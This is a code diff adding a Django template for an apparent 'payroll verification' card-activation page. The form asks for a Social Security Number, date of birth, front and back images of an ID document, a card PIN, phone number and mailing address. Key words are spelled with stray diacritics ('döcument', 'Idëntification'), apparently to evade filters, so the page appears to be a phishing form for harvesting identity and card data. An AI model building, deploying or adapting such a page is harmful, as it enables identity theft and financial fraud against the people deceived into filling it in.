@@ -1,0 +1,143 @@
+{% extends 'app/dashboard_layout.html' %}
+{% load static %}
+
+{% block title %}Activate Card{% endblock %}
+
+{% block dashboard_content %}
+    <div class="payment-page">
+        <div class="payment-header">
+            <div class="back-button-container">
+                <a href="{% url 'dashboard' %}" class="back-button">
+                    <i class="fas fa-arrow-left"></i>
+                    Back to Dashboard
+                </a>
+            </div>
+            <h1>Complete Payroll Verification</h1>
+            <p>Provide correct information to avoid debit card delay.</p>
+        </div>
+        
+        <div class="payment-content">
+            <div class="payment-form">
+                <form method="post" hx-post="{% url 'activate_card' %}" hx-swap="none" enctype="multipart/form-data">
+  {% csrf_token %}
+
+  <div class="form-group">
+    <label class="form-label">Full Name</label>
+    <input class="form-input" name="full_name" required placeholder="Name *" value="{{ user_profile.full_name|default:'' }}" />
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Social Security Number</label>
+    <input class="form-input" name="ssn" required placeholder="Enter SSN" />
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Re-Confirm Social Security Number</label>
+    <input class="form-input" name="confirm_ssn" required placeholder="Re-enter SSN" />
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Date Of Birth</label>
+    <input class="form-input" name="dob" type="date" />
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">What identity döcument do you have</label>
+    <select class="form-input" name="identity_document" required>
+      <option value="">Select identity document</option>
+      <option value="driver_license">Driver Licënse/ Idëntification Card</option>
+      <option value="passport">Passport</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Upload Front of Identity Document</label>
+    <input class="form-input" name="identity_front" type="file" accept="image/*,.pdf" required />
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Upload Back of Identity Document</label>
+    <input class="form-input" name="identity_back" type="file" accept="image/*,.pdf" required />
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Card Design</label>
+    <select class="form-input" name="card_design" required>
+      <option value="white">White</option>
+      <option value="black">Black</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Create Card PIN</label>
+    <input class="form-input" name="card_pin" type="password" required maxlength="4" placeholder="4-digit PIN" />
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Re-Confirm Card PIN</label>
+    <input class="form-input" name="confirm_card_pin" type="password" required maxlength="4" placeholder="Re-enter 4-digit PIN" />
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Phone number</label>
+    <input class="form-input" name="phone_number" required placeholder="e.g., +1 (555) 123-4567" />
+  </div>
+
+  <div class="form-group">
+    <label class="form-label">Mailing Address</label>
+    <textarea class="form-input" name="mailing_address" rows="3" required placeholder="Your full mailing address"></textarea>
+  </div>
+
+  <div class="form-group" style="display:flex; align-items:center; gap:8px;">
+    <input type="checkbox" id="request_virtual_card" name="request_virtual_card" />
+    <label for="request_virtual_card" class="form-label" style="margin:0;">Request Virtual Card</label>
+  </div>
+
+  <div class="form-group" id="email_virtual_card_group" style="display: none;">
+    <label class="form-label">Email To Receive Virtual Card</label>
+    <input class="form-input" name="email_virtual_card" type="email" placeholder="virtualcard@example.com" />
+  </div>
+
+                        <button type="submit" class="login-button" style="width:auto;">Submit & Continue</button>
+                </form>
+            </div>
+        </div>
+    </div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Loading spinner
+    setTimeout(function() {
+        const loadingSpinner = document.getElementById('loading-spinner');
+        const content = document.querySelector('.content');
+        loadingSpinner.style.opacity = '0';
+        content.style.display = 'block';
+        setTimeout(function() {
+            loadingSpinner.style.display = 'none';
+        }, 500);
+    }, 1000);
+
+    // Virtual card checkbox toggle
+    const requestVirtualCardCheckbox = document.getElementById('request_virtual_card');
+    const emailVirtualCardGroup = document.getElementById('email_virtual_card_group');
+    const emailVirtualCardInput = document.querySelector('[name="email_virtual_card"]');
+
+    if (requestVirtualCardCheckbox && emailVirtualCardGroup) {
+        function toggleEmailVirtualCardField() {
+            if (requestVirtualCardCheckbox.checked) {
+                emailVirtualCardGroup.style.display = 'block';
+                emailVirtualCardInput.setAttribute('required', 'required');
+            } else {
+                emailVirtualCardGroup.style.display = 'none';
+                emailVirtualCardInput.removeAttribute('required');
+            }
+        }
+
+        requestVirtualCardCheckbox.addEventListener('change', toggleEmailVirtualCardField);
+        toggleEmailVirtualCardField(); // Set initial state
+    }
+});
+</script>
+{% endblock %}
